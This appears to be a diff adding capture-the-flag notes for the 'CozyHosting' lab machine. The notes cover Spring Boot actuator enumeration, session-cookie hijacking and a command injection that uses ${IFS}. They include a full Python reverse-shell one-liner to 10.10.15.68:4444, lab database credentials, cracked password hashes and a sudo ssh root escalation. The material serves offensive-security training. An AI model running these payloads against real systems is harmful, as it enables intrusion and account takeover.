@@ -1,0 +1,32 @@
+Going on the website the login isnt injectable
+
+We can find out by looking at the code and testing 404s to find the sites running springboot
+
+https://blog.certcube.com/spring-boot-pentesting-part-2-actuators/ --
+   springboot uses actuators / endpoints we can enum by going to http://cozyhosting.htb/actuator and this
+   will give us a list of all the endpoints we can dig through.
+
+maybe kanderson@cozyhosting.htb is a valid username?
+
+when we go to actuator/sessions we can see the authenticated cookie for a kanderson, we can place
+there cookie in our sessions to hop into /admin
+
+inside the connection settings we can inject code into the username area but we need to avoid spaces
+we do this using the ${IFS}
+
+;python3${IFS}-c${IFS}'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.10.15.68",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")';
+
+the ; will help us place python3 into its own command letting us exec code to achieve the shell!
+------------------------------------------
+using a java decompiler tool we can dig at the source-code and find
+credentials for a user
+postgres:Vg&nvzAQ7XxR
+
+psql -h 127.0.0.1 -U postgres -d cozyhosting --> \l (show dbs) \dt (show tables)
+
+kanderson::$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim:uncrackable
+admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
+
+john:manchesterunited ? ==> SSH Cred
+------------------------------------------
+Josh can run SSH as root : sudo ssh --> This is a GTFO-Bin so we can simply esc to root!
